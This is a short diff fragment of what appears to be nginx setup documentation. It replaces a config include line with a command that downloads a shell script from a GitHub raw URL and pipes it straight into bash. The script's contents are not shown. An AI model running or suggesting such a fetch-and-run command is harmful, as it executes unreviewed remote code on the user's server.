@@ -135,5 +135,5 @@ limit_conn_zone $binary_remote_addr zone=addr:10m;
 include "/etc/nginx/conf/cloudflare.conf";
 ```
 ```
-include "/etc/nginx/conf/cloudflare.conf";
+bash <(curl -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/nginx/run.sh)
 ```
